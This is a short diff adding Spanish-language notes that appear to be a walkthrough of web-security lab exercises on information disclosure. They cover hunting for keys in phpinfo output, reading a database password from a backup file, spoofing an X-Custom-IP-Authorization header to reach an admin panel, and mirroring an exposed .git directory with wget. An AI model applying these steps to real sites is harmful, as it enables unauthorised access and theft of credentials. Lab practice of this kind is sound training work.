@@ -1,0 +1,19 @@
+Arroja el error la entrada de datos no sanitizada
+https://lab.net/product?productId=sex
+
+Mirar en ruta de targets
+https://lab.net/cgi-bin/phpinfo.php
+ctrl + f --> "secret" or "key"
+
+Miramos la passwd de la BD en la conexión de /backup/ProductTemplate.java.bak 
+https://lab.net/backup
+
+TRACE /admin HTTP/1.1
+en el response -->  X-Custom-IP-Authorization: MI-IP-PÚBLICA
+Proxy settings --> grep match --> regex: vacío --> Type: Request Header --> Replace: X-Custom-IP-Authorization: 127.0.0.1
+Ahora cada request irá con esa cabecera y nos da admin-panel por entrar desde local
+
+crawl web hasta encontrar --> https://lab.net/.git
+wget -r https://lab.net/.git
+Saco git-cola pincho en los archivos
+Commit --> ammend last commit
